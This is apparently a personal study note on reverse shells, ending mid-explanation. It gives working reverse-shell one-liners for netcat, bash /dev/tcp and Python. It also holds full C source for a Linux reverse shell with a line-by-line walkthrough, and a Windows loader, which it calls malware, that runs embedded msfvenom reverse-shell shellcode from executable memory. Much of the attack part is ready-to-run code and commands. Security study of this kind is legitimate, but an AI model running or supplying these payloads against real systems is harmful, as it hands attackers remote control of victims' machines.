---
title: Reverse Shell
aliases:
  - Reverse Shell
---
# 1. Simple netcat Reverse Shell
---
## Run command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `nc -e /bin/sh {attackers IP} port`

![[images/Pasted image 20250424100653.png]]

# 2. Netcat without -e
---
Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_HOLE` disabled, it means you **don’t have the -e** option of netcat.

> In this case,

## Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`

![[images/Pasted image 20250424101401.png]]

# 3. Bash
---
## Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`

![[images/Pasted image 20250424101632.png]]

# 4. Python
---
## Run Command

**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : 
`python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<Attacker's IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`

![[images/Pasted image 20250424120632.png]]

# 5. Reverse Shell in C for Linux 
---
## Code
```C
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {
	const char* ip = "192.168.0.108";
	
	// address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);
	
	// socket syscall
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// connect syscall
	connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
	
	for (int i = 0; i < 3; i++){
		// dup2(sockfd, 0) - stdin
		// dup2(sockfd, 1) - stdout
		// dup2(sockfd, 2) - stderr
		dup2(sockfd, i);
	}
	
	//execve syscall
	execve("/bin/sh", NULL, NULL);
	
	return 0;
}
```

### Explanation
---
```C
#include <stdio.h>
```

`<stdio.h>` : It is a **Header file** basic I/O like `printf()`, etc.

---
```C
#include <sys/socket.h>
```
`<sys/socket.h>` is a **header file in C** that provides the **definitions and functions for using sockets**—which are used for network communication.
#### Here's what it includes:

- **Socket-related system calls**:
    - `socket()` – create a socket
    - `bind()` – bind a socket to an IP/port
    - `connect()` – connect to another socket
    - `accept()` – accept an incoming connection
    - `listen()` – mark a socket as passive (waiting for connections)
    - `send()` / `recv()` – send or receive data
- **Socket structures and constants**:
    - `struct sockaddr`
    - `AF_INET`, `SOCK_STREAM`, etc.

`<sys/socket.h>` is what lets your C program **create and work with network sockets** on Unix-like systems.

---
```C
#include <netinet/ip.h>
```
`<netinet/ip.h>` is a C header file that provides **definitions for IP (Internet Protocol) related structures and constants**, specifically for **IPv4** networking.

- The key thing it defines is:
    - `struct iphdr` – this is the structure of an IPv4 header. It describes how an IP packet looks on the network.

In older or more complex socket programs (like raw sockets or packet crafting), you might manually build IP headers. That's when you'd need this file. But for **simple client/server TCP sockets** like your code, it's usually **not necessary** to include `<netinet/ip.h>` unless you’re doing low-level networking.

- `<netinet/ip.h>` gives you access to **IP packet structures**.
- Mostly used for **raw sockets**, **packet analysis**, or **custom protocol implementation**.

---
```C
#include <arpa/inet.h>
```
`<arpa/inet.h>` is a C header file that provides **functions for manipulating IP addresses**, especially for converting between **text (string) and binary formats** used in network programming.

 **🔧 Functions it provides (common ones):**

-  `inet_aton()`
	- Converts a string IP like `"192.168.1.1"` to a binary form.
	- Used in code:
	  ```c
	    inet_aton(ip, &addr.sin_addr);
	    ```
-  `inet_ntoa()`
	- Opposite of `inet_aton()` — converts a binary IP back to a string.
- `inet_pton()` and `inet_ntop()`
	- Newer versions of `aton` and `ntoa`, and they support both **IPv4 and IPv6**.
	- `pton`: presentation → numeric        
    - `ntop`: numeric → presentation        

When you're dealing with sockets in C, the system doesn't understand IPs as strings like `"10.9.1.6"` — it wants them in **binary form** (`struct in_addr`), and `<arpa/inet.h>` gives you the tools to do that conversion.

| Function                                  | What it does                                                                                                         |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `inet_aton()`                             | "192.168.0.1" → binary                                                                                               |
| `inet_ntoa()`                             | binary → "192.168.0.1"                                                                                               |
| `inet_pton()`                             | text to binary (IPv4/IPv6)                                                                                           |
| `inet_ntop()`                             | binary to text (IPv4/IPv6)                                                                                           |
| `uint32_t htonl(uint32_t hostlong)`       | The **htonl**() function converts the unsigned integer _hostlong_ from host byte order to network byte order.        |
| `uint16_t htons(uint16_t hostshort);`<br> | The **htons**() function converts the unsigned short integer _hostshort_ from host byte order to network byte order. |
| `uint32_t ntohl(uint32_t netlong);`<br>   | The **ntohl**() function converts the unsigned integer _netlong_ from network byte order to host byte order.         |
| `uint16_t ntohs(uint16_t netshort);`      | The **ntohs**() function converts the unsigned short integer _netshort_ from network byte order to host byte order.  |

---
```C
#include <unistd.h>
```
`<unistd.h>` is a **POSIX (Unix standard)** header file that gives you access to **low-level OS functions**, mainly related to **I/O, processes, and [file descriptors](https://en.wikipedia.org/wiki/File_descriptor)**.

**`dup2(int oldfd, int newfd)`**
- Duplicates one [file descriptor](https://en.wikipedia.org/wiki/File_descriptor) onto another.
- In  code:
    ```c
    dup2(sockfd, i);
    ```
This redirects `stdin`, `stdout`, and `stderr` to the socket.

**`execve(const char *path, char *const argv[], char *const envp[])`**
- Replaces the current process with a new one.
- In code:
    ```c
    execve("/bin/sh", NULL, NULL);
    ```
This gives the attacker a shell.

**Other common things in `<unistd.h>`:**

| Function   | What it does                            |
| ---------- | --------------------------------------- |
| `read()`   | Read data from a file/socket            |
| `write()`  | Write data to a file/socket             |
| `fork()`   | Create a new process                    |
| `close()`  | Close a file descriptor                 |
| `getpid()` | Get the current process ID              |
| `sleep()`  | Pause execution for a number of seconds |
`<unistd.h>` gives you direct access to **system-level functions** for:
- **Process control**
- **File/socket I/O**
- **Execing new programs**

It's essential for making C programs that interact closely with the OS.

---
```C
int main()
```

In C, `main()` is the **entry point** of any program.

When you run a compiled C program, the operating system calls the `main()` function **first** — always. It’s where your program **starts executing**.

**📌 Why `int`?**

The `int` before `main` means the function returns an **integer** to the operating system. This value tells the system if the program **succeeded** or **failed**.
- Returning `0` means **success**.
- Returning any non-zero number usually means **an error**.
Example:

```c
int main() {
    // your code
    return 0; // success
}
```

**Variations of `main()`:**
1. **No command line arguments**:
    ```c
    int main() { ... }
    ```
2. **With command line arguments**:
    ```c
    int main(int argc, char *argv[]) { ... }
    ```
    - `argc` (argument count): Number of command-line arguments.
    - `argv` (argument vector): Array of strings containing the arguments.

---
```C
const char* ip = "192.168.0.108";
```

 **`const`**
- This means the value the pointer points to **can’t be changed**.
- You’re saying: _“I’m not going to modify this string.”_

 **`char*`**
- A pointer to a **character (char)** — in this case, the **first character of a string**.

**`"10.9.1.6"`**
- This is a **string literal** (a sequence of characters).
- It's stored in **read-only memory** in C.

**`ip`**
- This is the **variable name**, and it holds the pointer to the first character of the string.

---
```c
struct sockaddr_in addr;
```
You're creating a variable `addr` of type `struct sockaddr_in`.

This structure is used to **store IPv4 socket address information** — like IP address and port — that the socket will connect or bind to.

> **Why `sockaddr_in` and not just `sockaddr`?**

1.  `struct sockaddr_in` — **specific to IPv4**
- Contains **fields for IP and port** that are easy to work with.
- Designed to make **setting up IPv4 addresses** easier.
- Used for:
    - `connect()`, `bind()`, `accept()`, etc. — but via a cast to `sockaddr`.

```c
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton("10.9.1.6", &addr.sin_addr);
```

You set the IP and port **directly** using its named fields.

2.  `struct sockaddr` = **generic placeholder**

- It’s a more **abstract structure**.
- Used as a **base type** that works for **any protocol** (IPv4, IPv6, Unix domain, etc.).
- Looks like this:

```c
struct sockaddr {
    unsigned short sa_family;   // Address family (AF_INET, AF_INET6, etc.)
    char sa_data[14];           // Protocol-specific address data
};
```

**Notice:** it doesn’t tell you **how to structure IP addresses or ports** - it just holds raw data.

The actual structure (like `sockaddr_in` for IPv4 or `sockaddr_in6` for IPv6) is **cast to `sockaddr*`** when passed into socket functions.

> **🧠 Analogy**

Think of `sockaddr` as a **base class** or **interface** (like in OOP).  
And `sockaddr_in`, `sockaddr_in6`, `sockaddr_un` are the **specific implementations**.

You _store the real info_ in `sockaddr_in`, but _pass it around_ as a `sockaddr*`.

| Struct        | Use for | Contains IP & Port? | Used in system calls |
| ------------- | ------- | ------------------- | -------------------- |
| `sockaddr_in` | IPv4    | ✅ Yes               | ✅ (via cast)         |
| `sockaddr`    | Generic | ❌ No (raw only)     | ✅ Required type      |

---
```C
addr.sin_family = AF_INET
```

`sin_family` is a field inside the `struct sockaddr_in` structure.  
It tells the system **what kind of addresses you're working with**.

| Constant   | Meaning                 |
| ---------- | ----------------------- |
| `AF_INET`  | IPv4 addresses          |
| `AF_INET6` | IPv6 addresses          |
| `AF_UNIX`  | UNIX domain (local IPC) |

This is critical because without it, the system won’t know how to interpret the rest of the data (like `sin_port` and `sin_addr`).

- `addr.sin_family = AF_INET;`  
    ➤ You're saying, _"this socket uses IPv4 addresses."_

---
```C
addr.sin_port = htons(4444);
```

`sin_port` is a field in the `struct sockaddr_in` that stores the **port number** your program will connect to or listen on.

Ports must be stored in **network byte order**, not the way your computer stores numbers (host byte order).  

That’s where `htons()` comes in.

`htons()` is a function from `<arpa/inet.h>`
`htons()` stands for:

> **Host TO Network Short**

- **Host** = your machine's internal number format (could be [little-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/)).
- **Network** = the standard [big-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/) format used in networking.
- **Short** = 16-bit number (because a port is 2 bytes).

```c
htons(4444)
```

➡ Converts `4444` to a 16-bit **network byte order** number.

**🧠 Why is byte order important?**

Different computers may store bytes differently (big-endian vs little-endian).  
But on the internet, everyone agrees to use **network byte order** (big-endian).

> [!Hint] Title
> If you don’t convert the port using `htons()`, it could look like a totally different number on the network.

> “Store port `4444` in network byte order in the `addr` structure.”

| Part            | Meaning                                                  |
| --------------- | -------------------------------------------------------- |
| `addr.sin_port` | The port number field in `sockaddr_in`                   |
| `htons(4444)`   | Converts port 4444 to **network byte order**             |
| Why?            | So all devices on the network understand it the same way |

---
```C
inet_aton(ip, &addr.sin_addr);
```

> **What is `inet_aton()`?**

It stands for: 
	**Internet** – **ASCII TO Network**

In short:
- Converts an IP address **in text (string)** form (like `"10.9.1.6"`)

| Function                  | Purpose                                      |
| ------------------------- | -------------------------------------------- |
| `inet_aton()`             | Converts IP from string → binary (`in_addr`) |
| Input ➡ `ip`              | `"10.9.1.6"` (text)                          |
| Output ➡ `&addr.sin_addr` | Stored in `addr.sin_addr` in binary          |
1. **`char* ip = "10.9.1.6";`**
This line declares a **pointer to a string**:
```c
char* ip = "10.9.1.6";
```
- `char* ip` means you're declaring a pointer that will point to a character (`char`), or more specifically, a sequence of characters (a string). 
- `"10.9.1.6"` is a **string literal**. This is essentially an array of characters in memory:
    ```
    10.9.1.6\0
    ```
    The `\0` at the end is the **null terminator** that marks the end of the string in C.
- `ip` will point to the **first character** of this string. So, `ip` stores the **memory address** where `"10.9.1.6"` starts.

2. **What Does `inet_aton(ip, &addr.sin_addr)` Do?**
- `inet_aton()` converts a **dotted-decimal string IP address** (like `"10.9.1.6"`) to its **binary representation** (network byte order).
- The first parameter (`ip`) is the **string** you want to convert — it’s just the **memory address** of the first character of `"10.9.1.6"`.
- The second parameter (`&addr.sin_addr`) is the **memory location** where the result will be stored. `&addr.sin_addr` gives us the **address** of `sin_addr` in the `sockaddr_in` structure, which is of type `struct in_addr`.

3. **What Does `inet_aton` Do Internally?**
Here’s what happens when `inet_aton()` runs:
- It reads the string `"10.9.1.6"`.
- It converts it to **binary** in **network byte order**.

For example:
- `"10.9.1.6"` becomes `0x0A090106` (in hexadecimal).
    - `10` → `0x0A`
    - `9` → `0x09`
    - `1` → `0x01`
    - `6` → `0x06`
- This value is **stored** in the `sin_addr.s_addr` field of `addr`. Since `inet_aton()` uses network byte order, it would be stored as:
    ```
    0x0A090106
    ```

4. **What Does `addr.sin_addr` Contain?**
After calling `inet_aton(ip, &addr.sin_addr)`:
- `addr.sin_addr` will contain the **binary representation** of the IP address.
In this case:
```c
addr.sin_addr.s_addr = 0x0A090106;  // Network byte order: 10.9.1.6
```

The **conversion** happens internally, and the result is stored in the second argument (`struct in_addr *inp`).

For example:

```c
inet_aton("10.9.1.6", &addr.sin_addr);
```

- **`"10.9.1.6"`** is the **string IP address**.
- **`&addr.sin_addr`** is the **pointer to the memory location** where the **binary network form** of the IP will be stored.
 So:
- `inet_aton()` **does not return the binary address directly**.
- Instead, it **stores the binary address in the location** pointed to by `inp` (in this case, `&addr.sin_addr`).
- The function itself just returns `1` (success) or `0` (failure).

---
```C
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

The `socket()` function is used to create a **new socket** for communication between processes over a network. It's the first step in setting up communication.
1. **`AF_INET`** (Address Family)
	- **`AF_INET`** stands for **Address Family - Internet**.
	- It means you're using **IPv4 addresses** (like `192.168.0.1` or `10.9.1.6`).
If you wanted to use IPv6 addresses instead, you would use:
```c
AF_INET6
```

2. **`SOCK_STREAM`** (Socket Type)
	- **`SOCK_STREAM`** means you're creating a **stream socket**.
	- **Stream sockets** provide **reliable, connection-oriented communication** (like TCP).
	- **TCP (Transmission Control Protocol)** is used for most network communications because it ensures that data is delivered correctly and in order.
If you wanted to use a **datagram socket** (which is connectionless, like UDP), you would use:
```c
SOCK_DGRAM
```
3. **`0`** (Protocol)
	- The third argument (`0`) specifies the protocol to be used.
	- When it's set to `0`, it tells the system to automatically pick the correct protocol based on the **address family** and **socket type**.
For **IPv4 + SOCK_STREAM**, the system will choose **TCP** as the default protocol (since it's the most common for stream sockets).
You could manually specify a protocol like this:
```c
IPPROTO_TCP   // For TCP
IPPROTO_UDP   // For UDP
```

**🔥 What if we Wrote:**

```c
int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);
```
You're combining:
- `AF_INET` → IPv4 (✅ OK)
- `SOCK_STREAM` → **TCP**-style connection (✅ valid type)
- `IPPROTO_UDP` → **UDP** protocol (❌ mismatch!)

**💥 What Happens?**
This is a **mismatch** between **socket type** and **protocol**:

| Socket Type   | Expected Protocol |
| ------------- | ----------------- |
| `SOCK_STREAM` | `IPPROTO_TCP`     |
| `SOCK_DGRAM`  | `IPPROTO_UDP`     |
If you mix these up:
- Most systems will **return `-1`** from `socket()`
- `errno` will be set to something like `EPROTONOSUPPORT` (Protocol not supported)
- Your program will fail to create the socket

**✅ The Correct Combinations:**

| Code Snippet                                | Meaning                            |
| ------------------------------------------- | ---------------------------------- |
| `socket(AF_INET, SOCK_STREAM, 0)`           | TCP (system chooses `IPPROTO_TCP`) |
| `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)` | Same, but explicitly TCP           |
| `socket(AF_INET, SOCK_DGRAM, 0)`            | UDP (system chooses `IPPROTO_UDP`) |
| `socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)`  | Same, but explicitly UDP           |

🔸 **What Happens Inside the `socket()` Call?**
1. The **operating system** creates a new socket object in the kernel.
2. It associates this socket with the **networking protocols** based on the arguments you provided (`AF_INET`, `SOCK_STREAM`, and `0`). 
3. It returns a **[file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** (which is an integer, here it's `sockfd`) that you can use to refer to this socket for later operations, like connecting, reading, writing, etc.

`sockfd`:
- **`sockfd`** will hold the **socket [file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** - a unique identifier for this socket.
- You’ll use this descriptor to perform actions on the socket (e.g., connect, send, receive).
> **In Summary:**
1. Creates a **TCP socket** (since `SOCK_STREAM` and `AF_INET` are used).
2. The socket will be used for **IPv4** addresses (`AF_INET`).
3. `0` lets the system pick the default protocol (TCP for stream sockets).
4. The **file descriptor** for the new socket is stored in `sockfd`, which will be used in future socket-related operations like `connect()`, `bind()`, `send()`, etc.
---
```c
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
```

This function is trying to connect your program (the **client**) to a **remote server**.

> 🧠 Function Signature:

```c
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

| Parameter                  | Description                                                                                          |
| -------------------------- | ---------------------------------------------------------------------------------------------------- |
| `sockfd`                   | The socket file descriptor you created with `socket()`                                               |
| `(struct sockaddr *)&addr` | Pointer to the **destination address** you're trying to connect to, cast to a generic socket address |
| `sizeof(addr)`             | Size of the `addr` structure in bytes                                                                |
> 🧠 Expression:
```c
(struct sockaddr *)&addr
```

 “Take the memory address of the variable `addr`, and **treat it as a pointer** to a `struct sockaddr`.”

 >**Step-by-Step Breakdown:**

1. `addr` is a `struct sockaddr_in`
	In your code:
	```c
	struct sockaddr_in addr;
	```
	This structure looks like:
	```c
	struct sockaddr_in {
	    short            sin_family;   // address family (AF_INET)
	    unsigned short   sin_port;     // port number
	    struct in_addr   sin_addr;     // IP address
	    char             sin_zero[8];  // padding
	};
	```
	This is specifically for **IPv4 addresses**.

2. `connect()` wants `struct sockaddr*`
	But the `connect()` function is defined like this:
	```c
	int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	```
	Notice that it wants a pointer to a **generic struct `sockaddr`**, not `sockaddr_in`.
	```c
	struct sockaddr {
	    unsigned short sa_family;
	    char           sa_data[14];
	};
	```

 🔍 So the `sockaddr` is a **generic version** that can represent multiple address types (IPv4, IPv6, Unix sockets, etc.)

 >⚠️ Problem:

- Your address is stored in a **`sockaddr_in`**.   
- But the function expects a **`sockaddr*`**.

>**Solution**: Use Typecasting

That’s why we do:
```c
(struct sockaddr *)&addr
```
This:
- Takes the memory address of `addr` (`&addr`)
- Typecasts it to a `struct sockaddr*` (generic type)
- Satisfies the function's parameter requirement

Even though the types are different, they are **compatible in memory layout** for IPv4. So this is safe to do as long as the real structure is `sockaddr_in`.

In C networking, almost all the socket functions that work with addresses use `struct sockaddr*`. But we pass `sockaddr_in*` (or `sockaddr_in6*` for IPv6) and **typecast** them.

>What Happens Internally?

1. **`connect()`** sends a SYN packet to the remote server’s IP and port (in `addr`).
2. The server should respond with a SYN-ACK. 
3. Your system replies with ACK, completing the **3-way TCP handshake**.
4. Now the socket is **connected**, and you can use `send()`, `recv()`, etc.

---
```C
for (int i = 0; i < 3; i++){
	dup2(sockfd, i);
}
```

>🎯 **What is `dup2()`?**

`dup2(oldfd, newfd)` is a **UNIX system call** that duplicates a file descriptor.
 **It means:**  
 👉 “Make `newfd` refer to the same file (or socket) as `oldfd`.”

##### 🔧 File Descriptors (FDs)

In UNIX-like systems, every file, socket, or device is represented by an integer - a **file descriptor**.

Standard ones are:

| FD  | Description              |
| --- | ------------------------ |
| 0   | Standard Input (stdin)   |
| 1   | Standard Output (stdout) |
| 2   | Standard Error (stderr)  |

- You’re replacing
    - `stdin` (0)
    - `stdout` (1)
    - `stderr` (2)
- With your **socket file descriptor (`sockfd`)**.

**That means:**
> Anything the shell **reads from input**, **writes to output**, or **prints as an error**, now goes over the **network socket** instead of the terminal.

 **What Happens:**

| `dup2(sockfd, 0)` | Replace stdin with the socket  |
| ----------------- | ------------------------------ |
| `dup2(sockfd, 1)` | Replace stdout with the socket |
| `dup2(sockfd, 2)` | Replace stderr with the socket |

So when the shell starts, it thinks it’s talking to a normal terminal — but it’s actually reading/writing through the network socket to the attacker machine.
##### 🔒 Why Is This Used in Reverse Shells?

When you do:
```c
execve("/bin/sh", NULL, NULL);
```
You're launching a shell. Normally, it would talk to your keyboard and screen. But by running `dup2()` before it, you're:

✅ Hijacking input/output  
✅ Routing them over the network  
✅ Giving control of the shell to whoever is on the other side of the socket

- `dup2(sockfd, i)` replaces standard I/O file descriptors with the socket
- The shell launched later will **send/receive data through the socket**
- That’s how reverse shells "hook" into your terminal session remotely
---
```C
execve("/bin/sh", NULL, NULL);
```

 >**What is `execve()`?**

`execve()` is a **low-level system call** that replaces the **current process** with a **new one**.
##### Syntax:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

| Parameter  | Meaning                                                    |
| ---------- | ---------------------------------------------------------- |
| `pathname` | Path to the executable you want to run (`/bin/sh`)         |
| `argv[]`   | Arguments to the program (like `argv[0]`, `argv[1]`, etc.) |
| `envp[]`   | Environment variables for the program                      |

```c
execve("/bin/sh", NULL, NULL);
```
**This means:**
- 📍 `"run the shell program"`
- ❌ "with no arguments"
- ❌ "with no environment variables"

 **You're telling the system:**  
 “Replace this process with `/bin/sh` (Bourne shell), and start it **from scratch**.”

>What does **`execve()`** do exactly?

- **Does NOT return** if successful — the current program is **replaced**.
- Your original C code is gone — only the shell exists in memory now.
- Because you already did:
    ```c
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    ```
	The shell’s **input/output/error** go through the **network socket**!
---
## Run Command

**Attacker's Machine** : Create `shell.c`- paste the above code and replace your attacker's ip with 192.168.0.108 in 8ᵗʰ line.
**Attacker's Machine** : `gcc -o shell shell.c -w`
**Victim's Machine** : `nc -lvnp 4444 > shell`
**Attacker's Machine** : `nc -lvnp 4444`
**Victim's Machine** : `chmod +x shell`
**Victim's Machine** : `./shell`

![[images/Pasted image 20250425161105.png]]

# 6. Reverse Shell in C++ for Windows
---
**On attacker's Machine run:** 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker's ip> LPORT=4444 -f c
```
![[images/Pasted image 20250426112907.png]]

So, Here our payload in created
```
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x6c"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
```

> Now we will **insert** this code in out **Malware**.

## Code
---
```C
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload: reverse shell (msfvenom)
unsigned char my_payload[] ="\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x6c"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
	void * my_payload_mem; // memory buffer for payload
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	
	// Allocate a memory buffer for payload
	my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// copy payload to buffer
	RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
	
	// make new buffer as executable
	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
	
	if ( rv != 0 ) {
		// run payload
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}

```

### Explanation
---
```C
#include <windows.h>
```

`windows.h` is a **Windows-specific header file** that lets your program use the **Windows API** — which is a massive collection of functions Microsoft provides for doing stuff on Windows.

---
```C
#include <stdio.h>
```

`<stdio.h>` stands for **Standard Input Output Header** in C and C++.

It provides functions for **basic input and output**, like:

|Function|What It Does|
|---|---|
|`printf`|Print to console|
|`scanf`|Read from user input|
|`fopen`|Open a file|
|`fread`|Read data from a file|
|`fwrite`|Write data to a file|
|`fclose`|Close a file|

---
```C
#include <stdlib.h>
```

`<stdlib.h>` stands for **Standard Library** header in C/C++. It gives you access to **general-purpose utility functions** — especially for:

|Category|Example Functions|Purpose|
|---|---|---|
|Memory|`malloc`, `free`, `realloc`|Dynamic memory allocation|
